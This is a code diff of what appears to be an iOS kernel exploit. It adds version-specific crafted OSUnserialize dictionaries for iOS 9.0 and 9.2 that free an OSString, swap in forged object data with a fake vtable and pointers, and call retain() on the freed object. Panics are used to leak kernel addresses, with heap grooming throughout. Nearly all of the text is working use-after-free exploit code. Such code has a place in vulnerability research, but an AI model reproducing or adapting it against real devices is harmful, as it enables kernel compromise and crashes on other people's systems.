@@ -5,6 +5,7 @@
 #include <IOKit/IOKitLib.h>     // IO*, io_*
 
 #include "common.h"             // DEBUG
+#include "device.h"             // get_os_version
 #include "io.h"                 // kOS*, dict_parse, _io_*
 #include "slide.h"              // get_kernel_anchor, get_kernel_slide
 #include "try.h"                // THROW, TRY, RETHROW
@@ -66,7 +67,8 @@ void uaf_with_vtab(addr_t addr)
     uint32_t *data = (uint32_t*)&osstr;
     const char str[4] = "str",
                ref[4] = "ref";
-    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
+    uint32_t
+    dict_92[8 + sizeof(OSString) / sizeof(uint32_t)] =
     {
         kOSSerializeMagic,                                              // Magic
         kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
@@ -94,13 +96,56 @@ void uaf_with_vtab(addr_t addr)
         kOSSerializeSymbol | 4,                                         // Just a name
         *((uint32_t*)ref),
         kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
+    },
+    dict_90[13 + sizeof(OSString) / sizeof(uint32_t)] =
+    {
+        kOSSerializeMagic,                                              // Magic
+        kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
+
+        kOSSerializeSymbol | 4,                                         // Just a name
+        *((uint32_t*)str),
+        kOSSerializeString | 4,                                         // String that'll get freed
+        *((uint32_t*)str),
+
+        kOSSerializeObject | 1,                                         // Same name as before
+        kOSSerializeBoolean | 1,                                        // Whatever value
+
+        kOSSerializeObject | 1,                                         // Same name again
+        kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
+#ifdef __LP64__
+        data[0],                                                        // vtable (lower half)
+        data[1],                                                        // vtable (upper half)
+        data[2],                                                        // retainCount
+        data[3],                                                        // flags
+        data[4],                                                        // length
+        data[5],                                                        // (padding)
+        data[6],                                                        // string pointer (lower half)
+        data[7],                                                        // string pointer (upper half)
+#else
+        data[0],                                                        // vtable
+        data[1],                                                        // retainCount
+        data[2],                                                        // flags
+        data[3],                                                        // length
+        data[4],                                                        // string pointer
+#endif
+
+        kOSSerializeSymbol | 4,                                         // Just a name
+        *((uint32_t*)ref),
+        kOSSerializeEndCollection | kOSSerializeObject | 2,             // Call ->retain() on the freed string
     };
 
     print_info();
 
     DEBUG("Triggering panic!");
 
-    dict_parse(dict, sizeof(dict));
+    if(get_os_version() >= V_13C75) // 9.2
+    {
+        dict_parse(dict_92, sizeof(dict_92));
+    }
+    else
+    {
+        dict_parse(dict_90, sizeof(dict_90));
+    }
     // Write everything to disk
     sync();
     // Allow SSH/syslog to deliver latest output
@@ -126,7 +171,7 @@ void uaf_panic_leak_vtab(void)
     const char str[4] = "str";
     uint32_t
     // The trigger
-    dict[5] =
+    dict_92[5] =
     {
         kOSSerializeMagic,                                              // Magic
         kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
@@ -134,6 +179,21 @@ void uaf_panic_leak_vtab(void)
         kOSSerializeString | 4,                                         // String that'll get freed
         *((uint32_t*)str),
         kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
+    },
+    dict_90[9] =
+    {
+        kOSSerializeMagic,                                              // Magic
+        kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
+
+        kOSSerializeSymbol | 4,                                         // Just a name
+        *((uint32_t*)str),
+        kOSSerializeString | 4,                                         // String that'll get freed
+        *((uint32_t*)str),
+
+        kOSSerializeObject | 1,                                         // Same name
+        kOSSerializeBoolean | 1,                                        // Whatever value
+
+        kOSSerializeEndCollection | kOSSerializeObject | 2,             // Call ->retain() on the freed string
     },
     // the slot for the trigger
     dict_hole[6] =
@@ -180,10 +240,17 @@ void uaf_panic_leak_vtab(void)
             dict_pad[2 + i * 4 + 2] |= kOSSerializeEndCollection;
         }
     }
-    PRINT_BUF("dict"     , dict,      sizeof(dict));
-    PRINT_BUF("dict_hole", dict_hole, sizeof(dict));
-    PRINT_BUF("dict_plug", dict_plug, sizeof(dict));
-    PRINT_BUF("dict_pad" , dict_pad,  sizeof(dict));
+    if(get_os_version() >= V_13C75) // 9.2
+    {
+        PRINT_BUF("dict_92", dict_92, sizeof(dict_92));
+    }
+    else
+    {
+        PRINT_BUF("dict_92", dict_90, sizeof(dict_90));
+    }
+    PRINT_BUF("dict_hole", dict_hole, sizeof(dict_hole));
+    PRINT_BUF("dict_plug", dict_plug, sizeof(dict_plug));
+    PRINT_BUF("dict_pad" , dict_pad , sizeof(dict_pad) );
 
     DEBUG("Spawning user clients...");
     io_connect_t client_plug,
@@ -235,7 +302,14 @@ void uaf_panic_leak_vtab(void)
         // Async cleanup & allow SSH/syslog to deliver latest output
         sleep(3);
 
-        dict_parse(dict, sizeof(dict));
+        if(get_os_version() >= V_13C75) // 9.2
+        {
+            dict_parse(dict_92, sizeof(dict_92));
+        }
+        else
+        {
+            dict_parse(dict_90, sizeof(dict_90));
+        }
         DEBUG("...shit, we're still here.");
     })
     FINALLY
